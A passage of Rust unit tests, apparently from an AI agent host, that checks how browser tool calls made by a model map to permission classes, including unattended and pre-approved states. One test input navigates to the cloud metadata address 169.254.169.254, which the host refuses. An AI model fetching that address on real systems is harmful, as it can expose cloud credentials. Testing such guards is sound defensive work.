                    let _entered = s.enter();
                    (is_unattended(), is_pre_approved())
                };
                (inside, (is_unattended(), is_pre_approved()))
            })
            .join()
            .unwrap()
        };
        let plain = AskingState::of_this_thread();
        let alone = {
            let _g = unattended();
            AskingState::of_this_thread()
        };
        let approved = {
            let _g = pre_approved();
            AskingState::of_this_thread()
        };
        assert_eq!(there(plain), ((false, false), (false, false)), "a plain thread says nothing");
        assert_eq!(there(alone), ((true, false), (false, false)), "nobody is there: the questions are refused at once");
        assert_eq!(there(approved), ((false, false), (false, false)), "a flow's approval of its own step does not become the person's answer to the host's questions");
        assert!(!is_unattended() && !is_pre_approved(), "the thread that made the readings was not changed by them");
    }

    /// Card R6-08: the old routes' questions show what a call can do as the host's do, from the model's name for the tool.
    #[test]
    fn the_classes_of_a_call_are_the_ones_the_host_works_from_by_the_models_name_for_the_tool() {
        let p = policy(SiteMode::Ask);
        let classes = |wire: &str, args: Value| BrowserProvider::classes_of_wire_call(wire, &args, &p, false);
        let click = classes("browser_click", json!({"target": "e1"})).unwrap();
        assert!(click.contains(&PermClass::Write) && click.contains(&PermClass::Network) && !click.contains(&PermClass::Read), "{click:?}");
        assert_eq!(classes("browser_snapshot", json!({})), Some(vec![PermClass::Read]));
        assert_eq!(classes("browser_tabs", json!({"action": "list"})), Some(vec![PermClass::Read]), "listing the tabs only looks");
        assert!(classes("browser_tabs", json!({"action": "close", "index": 0})).unwrap().contains(&PermClass::Write));
        assert!(classes("browser_tabs", json!({})).unwrap().contains(&PermClass::Write), "no action named is a change");
        let script = classes("browser_evaluate", json!({"function": "() => 1"})).unwrap();
        assert!(script.contains(&PermClass::Execute) && script.contains(&PermClass::Network), "{script:?}");
        assert!(classes("browser_file_upload", json!({"paths": ["a.txt"]})).unwrap().contains(&PermClass::ExternalEffect));
        // An address the host refuses is still a network call.
        assert_eq!(classes("browser_navigate", json!({"url": "http://169.254.169.254/"})), Some(vec![PermClass::Network]));
        // Not a browser tool.
        assert_eq!(classes("Click", json!({})), None);
        assert_eq!(classes("local_find", json!({})), None);
    }

    #[test]
    fn the_browser_takes_part_in_the_door_and_a_skills_list_may_name_its_tools_as_the_model_does() {
        let root = std::env::temp_dir().join(format!("aqua_bprov_door_{}", std::process::id()));
        let _ = std::fs::create_dir_all(&root);
        let p = BrowserProvider::new(Arc::new(BrowserBackend::new(&root, crate::browser_mcp::new_browser_client())));
        assert!(p.door_applies());
        assert_eq!(p.restriction_names("browser.click"), vec!["browser_click".to_string()]);
        assert_eq!(p.restriction_names("browser.back"), vec!["browser_navigate_back".to_string()]);
        assert!(p.restriction_names("fs.read").is_empty());
        for m in p.manifests() {
            assert_eq!(p.restriction_names(&m.name).len(), 1, "{}", m.name);
        }
    }
}
